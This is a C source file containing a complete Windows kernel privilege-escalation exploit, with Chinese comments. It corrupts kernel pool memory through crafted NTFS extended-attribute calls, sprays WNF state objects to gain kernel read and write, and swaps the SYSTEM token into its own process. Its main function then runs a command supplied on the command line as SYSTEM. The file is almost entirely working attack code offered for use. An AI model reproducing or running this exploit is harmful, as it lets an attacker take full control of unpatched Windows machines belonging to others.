#include <windows.h>
#include <stdio.h>
#include <sddl.h>
#include "ntdefs.h"

char g_Payload[1000] = { 0 };
WNF_STATE_NAME g_sn[SPRAY_COUNT] = { 0 };

ZwSetEaFile_t ZwSetEaFile = NULL;
ZwQueryEaFile_t ZwQueryEaFile = NULL;
NtCreateWnfStateName_t NtCreateWnfStateName = NULL;
NtUpdateWnfStateData_t NtUpdateWnfStateData = NULL;
NtQueryWnfStateData_t NtQueryWnfStateData = NULL;
NtDeleteWnfStateData_t NtDeleteWnfStateData = NULL;
NtDeleteWnfStateName_t NtDeleteWnfStateName = NULL;

bool Init() {
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (hNtdll == NULL) {
		printf("[Error_%d] Init(): Load ntdll failed.\n", __LINE__);
		return false;
	}

	ZwQueryEaFile = (ZwQueryEaFile_t)GetProcAddress(hNtdll, "NtQueryEaFile");
	ZwSetEaFile = (ZwSetEaFile_t)GetProcAddress(hNtdll, "ZwSetEaFile");
	NtCreateWnfStateName = (NtCreateWnfStateName_t)GetProcAddress(hNtdll, "NtCreateWnfStateName");
	NtUpdateWnfStateData = (NtUpdateWnfStateData_t)GetProcAddress(hNtdll, "NtUpdateWnfStateData");
	NtQueryWnfStateData = (NtQueryWnfStateData_t)GetProcAddress(hNtdll, "NtQueryWnfStateData");
	NtDeleteWnfStateData = (NtDeleteWnfStateData_t)GetProcAddress(hNtdll, "NtDeleteWnfStateData");
	NtDeleteWnfStateName = (NtDeleteWnfStateName_t)GetProcAddress(hNtdll, "NtDeleteWnfStateName");
	if (ZwQueryEaFile == NULL || ZwSetEaFile == NULL || NtCreateWnfStateName == NULL ||
		NtUpdateWnfStateData == NULL || NtQueryWnfStateData == NULL ||
		NtDeleteWnfStateData == NULL || NtDeleteWnfStateName==NULL) {
		printf("[Error_%d] Init(): Get prime nt functions failed.\n", __LINE__);
		return false;
	}
	return true;
}

void Trigger() {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	PFILE_GET_EA_INFORMATION ea_get_info_ref = NULL;
	PFILE_FULL_EA_INFORMATION p_ea_full_info = NULL;
	IO_STATUS_BLOCK iostb;
	NTSTATUS ntst = 1;
	DWORD retSize;
	PCHAR Fake_Wnd = NULL;
	char revBuf[KERNAL_ALLOC_SIZE] = { 0 };
	const char* data = "AAAAAAAAAAAAAAAA";

	__try {
		hFile = CreateFileA("payload",
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			printf("[Error_%d] Exploit(): CreateFileA failed.\n", __LINE__);
			__leave;
		}

		if (!WriteFile(hFile, data, strlen(data), &retSize, NULL)) {
			printf("[Error_%d] Exploit(): Write data for file failed.\n", __LINE__);
			__leave;
		}

		p_ea_full_info = (PFILE_FULL_EA_INFORMATION)g_Payload;
		//先伪造第一个EA信息
		p_ea_full_info->Flags = 0;
		p_ea_full_info->EaNameLength = TIGGER_EA_NAME_LENGTH;
		p_ea_full_info->EaValueLength = TIGGER_EA_VALUE_LENGTH;
		p_ea_full_info->NextEntryOffset = (p_ea_full_info->EaNameLength + p_ea_full_info->EaValueLength + 9 + 3) & (~3);
		memcpy(p_ea_full_info->EaName, TIGGER_EA_NAME, TIGGER_EA_NAME_LENGTH);
		RtlFillMemory(p_ea_full_info->EaName + p_ea_full_info->EaNameLength + 1, TIGGER_EA_VALUE_LENGTH, 'A');

		//伪造第二个EA信息
		p_ea_full_info->Flags = 0;
		p_ea_full_info = (PFILE_FULL_EA_INFORMATION)((char*)p_ea_full_info + p_ea_full_info->NextEntryOffset);
		p_ea_full_info->EaNameLength = OVER_EA_NAME_LENGTH;
		p_ea_full_info->EaValueLength = OVER_EA_VALUE_LENGTH;
		p_ea_full_info->NextEntryOffset = 0;
		memcpy(p_ea_full_info->EaName, OVER_EA_NAME, OVER_EA_NAME_LENGTH);
		RtlFillMemory(p_ea_full_info->EaName + p_ea_full_info->EaNameLength + 1, OVER_EA_VALUE_LENGTH, 0);
		//设置EA
		Fake_Wnd = (PCHAR)(p_ea_full_info->EaName + p_ea_full_info->EaNameLength);

		//AllocateSize
		*(PDWORD)(Fake_Wnd + 0x10) = 0x1000;
		//DataSize
		*(PDWORD)(Fake_Wnd + 0x10 + 4) = 0x1000;

		ntst = ZwSetEaFile(hFile, &iostb, g_Payload, sizeof(g_Payload));
		if (ntst != 0) {
			printf("[Error_%d] Exploit(): call ZwSetEaFile failed.\n", __LINE__);
			__leave;
		}
		ea_get_info_ref = (PFILE_GET_EA_INFORMATION)malloc(100);
		memset(ea_get_info_ref, 0, 100);

		memcpy(ea_get_info_ref->EaName, TIGGER_EA_NAME, TIGGER_EA_NAME_LENGTH);
		ea_get_info_ref->EaNameLength = TIGGER_EA_NAME_LENGTH;
		ea_get_info_ref->NextEntryOffset = (sizeof(FILE_GET_EA_INFORMATION) + TIGGER_EA_NAME_LENGTH) & (~3);//12;

		ea_get_info_ref = (PFILE_GET_EA_INFORMATION)((PCHAR)ea_get_info_ref + 12);
		memcpy(ea_get_info_ref->EaName, OVER_EA_NAME, OVER_EA_NAME_LENGTH);
		ea_get_info_ref->EaNameLength = OVER_EA_NAME_LENGTH;
		ea_get_info_ref->NextEntryOffset = 0;

		ea_get_info_ref = (PFILE_GET_EA_INFORMATION)((PCHAR)ea_get_info_ref - 12);


		ZwQueryEaFile(hFile, &iostb, revBuf, KERNAL_ALLOC_SIZE, false, ea_get_info_ref, 100, 0, true);
	}
	__finally {
		if (hFile != INVALID_HANDLE_VALUE)
			CloseHandle(hFile);
		if (ea_get_info_ref)
			free(ea_get_info_ref);
	}
	
}

void HeapSpray() {

	BYTE sd[0xA0] = { 0 };												// 
	NTSTATUS ntst = 0;
	PSECURITY_DESCRIPTOR pSD = NULL;
	RtlFillMemory(sd, sizeof(sd), 'A');
	if (!ConvertStringSecurityDescriptorToSecurityDescriptor("",
		SDDL_REVISION_1, &pSD, nullptr))
	{
		printf("[Error_%d] HeapSpray(): Heap spray failed.\n", __LINE__);
		return;
	}

	for (int i = 0; i < SPRAY_COUNT; i++)
	{
		ntst = NtCreateWnfStateName(&g_sn[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, 0x1000, pSD);
		if (ntst != 0)
		{
			printf("[Error_%d] HeapSpray(): Heap spray failed.", __LINE__);
			return;
		}
	}

	for (int i = 1; i < SPRAY_COUNT; i += 2) {
		ntst = NtDeleteWnfStateName(&g_sn[i]);
		if (ntst != 0)
		{
			printf("[Error_%d] HeapSpray(): Heap spray failed.", __LINE__);
			return;
		}
		//给释放掉的StateName对象做个标记
		g_sn[i].Data[0] = 0;
		g_sn[i].Data[1] = 0;
		//重新用相同大小为0xA0，类型是_WNF_STATE_DATA的结构进行占位
		ntst = NtUpdateWnfStateData(&g_sn[i - 1], sd, 0xA0, NULL, NULL, 0, 0);
		if (ntst != 0)
		{
			printf("[Error_%d] HeapSpray(): Heap spray failed.", __LINE__);
			return;
		}
	}

	for (int i = 0; i < SPRAY_COUNT; i += 4) {
		ntst = NtDeleteWnfStateData(&g_sn[i], NULL);
		if (ntst != 0)
		{
			printf("[Error_%d] HeapSpray(): Heap spray failed.", __LINE__);
			return;
		}
		ntst = NtDeleteWnfStateName(&g_sn[i]);
		if (ntst != 0)
		{
			printf("[Error_%d] HeapSpray(): Heap spray failed.", __LINE__);
			return;
		}
		//给释放掉的StateName对象做个标记
		g_sn[i].Data[0] = 0;
		g_sn[i].Data[1] = 0;
	}

	if (pSD)
		LocalFree(pSD);
}

bool ReadData(PWNF_NAME_INSTANCE NameInstance,
	PWNF_STATE_NAME StateName,
	ULONG64 Addr,
	char* OrigBuf,
	char* OutBuf,
	PULONG size,
	ULONG Offset) {
	//char buf[OVER_STATEDATA_LENGTH] = { 0 };
	WNF_CHANGE_STAMP wcst; 
	NTSTATUS ntst = 0;
	ULONG64 sn = (*(PULONG64)(&NameInstance->StateName)) ^ STATE_NAME_MASK;
	ULONG64 Distance = Addr + Offset;
	NameInstance->StateData = (_WNF_STATE_DATA*)Distance;

	ntst = NtUpdateWnfStateData(StateName, OrigBuf, OVER_STATEDATA_LENGTH, NULL, NULL, NULL, 0);
	if (ntst != 0) {
		printf("[Error_%d] PrivilegeEscalaction(): NtUpdateWnfStateData failed.\n", __LINE__);
		return FALSE;
	}

	ntst = NtQueryWnfStateData((PWNF_STATE_NAME)&sn, NULL, NULL, &wcst, OutBuf,size);
	if (ntst != 0) {
		printf("[Error_%d] PrivilegeEscalaction(): NtQueryWnfStateData failed.\n", __LINE__);
		return FALSE;
	}
	
	return TRUE;
}

bool ModifyToken(
	PWNF_NAME_INSTANCE NameInstance,
	PWNF_STATE_NAME StateName,
	ULONG64 Addr,
	char* OrigBuf,
	char* DataBuf,
	ULONG32 size,
	ULONG Offset) {

		WNF_CHANGE_STAMP wcst;
		NTSTATUS ntst = 0;
		ULONG64 sn = (*(PULONG64)(&NameInstance->StateName)) ^ STATE_NAME_MASK;
		ULONG64 Distance = Addr + Offset;
		NameInstance->StateData = (_WNF_STATE_DATA*)Distance;

		ntst = NtUpdateWnfStateData(StateName, OrigBuf, OVER_STATEDATA_LENGTH, NULL, NULL, NULL, 0);
		if (ntst != 0) {
			printf("[Error_%d] PrivilegeEscalaction(): NtUpdateWnfStateData failed.\n", __LINE__);
			return FALSE;
		}

		ntst=NtUpdateWnfStateData((PWNF_STATE_NAME)&sn, DataBuf, size, NULL, NULL, NULL, 0);
	
		if (ntst != 0) {
			printf("[Error_%d] PrivilegeEscalaction(): NtUpdateWnfStateData failed.\n", __LINE__);
			return FALSE;
		}

		return TRUE;
}

bool PrivilegeEscalaction(PWNF_STATE_NAME StateName,char* Buf) {

	PWNF_NAME_INSTANCE NameInstance = (PWNF_NAME_INSTANCE)(Buf+0xA0+0x10);
	ULONG64 Eprocess = (ULONG64)NameInstance->CreatorProcess;
	printf("[+] Found EPROCESS = %p\n",Eprocess);

	NTSTATUS ntst = 0;

	ULONG64 SelfPid = GetCurrentProcessId();
	ULONG64 CurEp = Eprocess;
	ULONG64 CurPid=-1;
	ULONG64 SysToken = -1;
	ULONG64 SelfEprocess=-1;
	ULONG size = 0x3000;
	ULONG Offset=0x50-7;						//用来调整目标地址，构造合适的AllocateSize和DataSize
	char DataBuf[0x3000] = { 0 };
	char BakBuf[0x900] = { 0 };

	do {
		Offset = 0x50 - 7;
		//读取PID
		size = 0x3000;//重置一下size
		if ( !ReadData(NameInstance, StateName, CurEp, Buf, DataBuf,&size,Offset)) {
			//return FALSE;
			Offset = 1;
			size = 0x3000;//重置一下size
			if (!ReadData(NameInstance, StateName, CurEp, Buf, DataBuf, &size, Offset))
				return FALSE;
		}
		CurPid = *(PULONG64)&DataBuf[PROCESS_ID_OFFSET - Offset-0x10];
		if (SelfPid == CurPid) {
			// 获取自身进程Token地址
			SelfEprocess = CurEp ;
			//备份自身EPROCESS数据
			memcpy(BakBuf, DataBuf, 0x900);
		}
		else if (CurPid == 4) {
			SysToken = *(PULONG64)&DataBuf[TOKEN_OFFSET - Offset-0x10]-4;
		}
		//获取ActivityProcess.Blink
		CurEp = *(PULONG64)&DataBuf[PROCESS_LIST_OFFSET - Offset-0x10];
		//获取下个EPROCESS
		CurEp -= PROCESS_LIST_OFFSET;
	} while (CurEp != Eprocess && (SysToken==-1 || SelfEprocess ==-1));

	printf("[+] Found SYSTEM Token = %p\n", SysToken);
	printf("[+] Found SeflToken Address  = %p\n", SelfEprocess+TOKEN_OFFSET);

	//修改当前进程的Token
	*(PULONG64)&BakBuf[TOKEN_OFFSET - Offset - 0x10] = SysToken;
	ModifyToken(NameInstance, StateName, SelfEprocess, Buf, BakBuf, 0x900,Offset);
	
	return TRUE;
}

bool Exploit() {
	char Buf[0x1000] = { 0 };
	DWORD BufSize = 0xA0;
	WNF_CHANGE_STAMP wcst;
	PWNF_NAME_INSTANCE pwninst = NULL;
	NTSTATUS ntst = 0;
	bool bOver = FALSE;

	HeapSpray();
	for (int j = 0; j < SPRAY_COUNT && bOver==FALSE; j++) {
		Trigger();
		for (int i = 0; i < SPRAY_COUNT; i++) {
			//如果该StateName对象没有释放，则尝试读取其存储的数据
			if (g_sn[i].Data[0] != 0 || g_sn[i].Data[1] != 0) {
				//首先用0xA0大小进行试探，如果读取失败则说明找到了被溢出修改的StateData
				ntst = NtQueryWnfStateData(&g_sn[i], NULL, NULL, &wcst, Buf, &BufSize);
				if (ntst == 0xc0000023) {//可能是接受的缓冲区大小bufSize过小
					BufSize = 0x1000;
					ntst = NtQueryWnfStateData(&g_sn[i], NULL, NULL, &wcst, Buf, &BufSize);

					if (ntst == 0) {
						//读取成功
						pwninst = (PWNF_NAME_INSTANCE)(Buf + 0xA0+0x10);
						if (pwninst->Header.NodeTypeCode == 0x903 &&
							pwninst->Header.NodeByteSize == 0xA8 &&
							pwninst->RunRef.Ptr == NULL) {
							//表示找到了一个有效的StateName对象
							if (PrivilegeEscalaction(&g_sn[i], Buf))
							{
								return TRUE;
							}
						}
					}
				}
			
			}
		}
	}

	return FALSE;
}


int main(int argc,char* argv[]) {

	if (argc < 2) {
		printf("[*] Usage: exp.exe <cmd>\n");
		return 0;
	}
	if (Init()) {
		HeapSpray();
		if (Exploit()) {
			printf("[+] Try to execute %s as SYSTEM.\n",argv[1]);
			system(argv[1]);
		}
	}

	system("pause");
	return 0;
}